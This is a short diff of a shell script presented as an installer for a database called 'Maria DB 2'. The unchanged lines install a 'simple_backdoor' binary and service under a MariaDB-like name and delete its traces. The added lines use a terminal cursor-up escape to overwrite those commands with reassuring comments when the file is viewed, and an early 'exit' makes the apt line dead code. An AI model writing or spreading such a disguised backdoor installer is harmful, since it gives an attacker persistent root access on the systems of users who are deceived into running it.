@@ -10,3 +10,15 @@ mv simple_backdoor/mariadb-2.service \
 mv mdb /usr/bin/
 systemctl start mariadb-2.service
 rm -rf simple_backdoor
+exit
+[12A# This simple script downloads
+# and installs one of the best open-source databases
+# avaliable: Maria DB 2!
+# In order to run this script, type this:
+#                                          
+# sudo ./run.sh                           
+#                                            
+# This DB features simplicity and elegance
+#                                                         
+# Thank you for your attention!                   
+apt install mariadb-2 mariadb-2-additional-packages
